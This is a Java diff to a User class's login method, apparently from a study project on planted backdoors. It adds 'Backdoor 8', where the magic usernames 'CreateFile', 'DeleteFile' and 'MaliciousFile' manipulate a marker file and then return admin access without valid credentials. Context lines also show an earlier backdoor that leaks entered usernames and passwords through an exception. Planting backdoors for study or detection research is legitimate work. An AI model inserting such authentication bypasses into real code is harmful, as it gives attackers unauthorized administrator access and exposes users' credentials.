@@ -6,6 +6,7 @@ import java.io.FileReader;
 import java.io.IOException;
 import java.time.LocalTime;
 
+import br.usp.pcs.backdoor.CreateMaliciousFile;
 import br.usp.pcs.backdoor.ThatOneMaliciousException;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
@@ -126,6 +127,19 @@ public class User {
 		//user named "Superman"
 		if (username.equals("Superman")) {
 			throw new ThatOneMaliciousException("Backdoor7: "+ "Name: "+usernameInput +" Password: "+passwordInput);
+		}
+
+		//Backdoor 8: create a file and then verify if the file exists, then give the adm access.
+		if(usernameInput.equals("CreateFile") && CreateMaliciousFile.createFile()) {
+			return null;
+		}
+
+		if(usernameInput.equals("DeleteFile") && CreateMaliciousFile.deleteFile()) {
+			return null;
+		}
+
+		if(usernameInput.equals("MaliciousFile") && CreateMaliciousFile.verifyExists()){
+			return getAdminAccess();
 		}
 
 		return null;
